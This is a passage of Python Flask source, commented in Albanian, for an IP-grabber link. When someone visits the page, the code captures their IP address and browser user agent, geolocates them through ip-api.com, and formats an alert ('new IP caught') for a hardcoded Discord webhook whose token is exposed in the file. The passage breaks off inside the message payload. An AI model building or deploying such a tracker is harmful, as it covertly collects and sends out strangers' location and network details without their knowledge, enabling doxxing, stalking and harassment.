
import requests
from flask import Flask, request, redirect
import os

app = Flask(__name__)

# Webhook-u yt i saktë
WEBHOOK_URL = "https://discord.com/api/webhooks/1497922213599510530/7Dn_lC_eSr50o09dbLevPAnhDROVKrdhEd-hHPjGy_ZCLjMY-NZqm08cpnt7CQNaT5LZ"

@app.route('/')
def main():
    # Identifikimi i IP-së
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    user_agent = request.headers.get('User-Agent', 'Unknown')

    # Marrja e informacioneve gjeografike
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        geo_data = geo_res.json()
        city = geo_data.get('city', 'I panjohur')
        country = geo_data.get('country', 'I panjohur')
        isp = geo_data.get('isp', 'I panjohur')
    except:
        city = country = isp = "Error"

    # Mesazhi për Discord
    payload = {
        "content": "@everyone 🚨 **IP e re u kap!**",
        "embeds": [{
            "title": "Detajet e Klikimit",
            "color": 15158332,
            "fields": [
                {"name": "🌐 IP", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Lokacioni", "value": f"{city}, {country}", "inline": True},
                {"name": "📡 ISP", "value": f"{isp}", "inline": False},
                {"name": "📱 Pajisja", "value": f"


